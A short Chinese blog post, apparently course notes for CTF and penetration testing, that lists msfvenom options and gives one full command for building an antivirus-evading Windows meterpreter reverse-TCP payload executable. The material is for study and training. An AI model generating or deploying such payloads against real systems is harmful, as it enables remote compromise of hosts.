---
title: 17-MSF+Combalt Strike
date: 2025-08-13 13:57:37
tags: [CTF, web, 马士兵]
---

## Msfvenom

### 常用参数

-p  指定payload
-f  指定输出格式
-e  指定使用的encoder编码免杀
-a  指定payload的目标架构
-o  保存payload文件输出
-b  设定规避字符集
-n  为payload预先指定一个NOP滑动长度
-s  设定有效攻击载荷的最大长度（文件大小）
-i  指定payload的编码次数
-c  指定一个附加的win32 shellcode文件
-x  指定一个自定义的可执行文件作为模板
-k  保护模板程序的动作，payload作为新的进程运行
-v  指定一个自定义的变量，以确定输出格式

<!--more-->

生成一个Windows平台的payload:
```
msfvenom -a x86 —platform Windows -p windows/meterpreter/reverse_tcp LHOST=xxx LPORT=xxx -e x86/shikata_ga_nai -b ‘\x00\x0a\xff’ -i 3 -f exe -o payload.exe
```

## 漏洞利用流程